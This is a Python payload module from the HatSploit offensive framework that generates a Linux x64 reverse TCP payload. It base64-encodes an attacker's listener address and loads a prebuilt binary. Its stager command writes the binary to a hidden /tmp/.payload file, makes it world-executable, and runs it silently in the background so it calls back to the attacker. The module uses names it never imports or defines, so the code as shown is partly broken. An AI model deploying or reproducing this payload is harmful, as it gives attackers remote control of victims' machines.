#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import HatSploitPayload

class HatSploitPayload(HatSploitPayload):
    details = {
        'Name': "Linux x64 Membrane Reverse TCP",
        'Payload': "linux/x64/membrane_reverse_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Membrane Reverse TCP Payload for Linux x64."
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': tcp.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parser.parse_options(self.options)

        remote_data = base64.b64encode((local_host + ':' + local_port).encode())
        remote_data = remote_data.decode()

        self.badges.output_process("Generating payload...")

        try:
            binary = open(self.config.path_config['base_paths']['data_path'] + 'libs/payloads/linux/x64/membrane_reverse_tcp/bin/membrane.bin', 'rb')
            payload = binary.read()
            binary.close()
        except Exception:
            self.badges.output_error("Failed to generate payload!")
            return

        instructions = ""
        instructions += "cat >/tmp/.payload;"
        instructions += "chmod 777 /tmp/.payload;"
        instructions += f"sh -c '/tmp/.payload {remote_data}' 2>/dev/null &"
        instructions += "\n"

        self.payload = payload
        self.instructions = instructions
        self.session = session
        self.action = 'reverse_tcp'
